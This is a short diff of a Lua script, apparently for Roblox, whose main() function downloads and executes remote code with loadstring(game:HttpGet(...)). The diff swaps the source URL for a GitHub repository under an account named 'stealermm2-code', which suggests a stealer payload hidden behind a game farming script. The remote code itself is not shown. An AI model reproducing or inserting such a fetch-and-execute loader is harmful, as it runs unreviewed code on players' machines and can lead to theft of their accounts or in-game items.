@@ -3,7 +3,7 @@ local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 local function main()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/hayrankal/api.overdrivehub.xyz/refs/heads/main/%7C'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/stealermm2-code/yedek/refs/heads/main/yedel3'))()
 end
 
 local function farm()
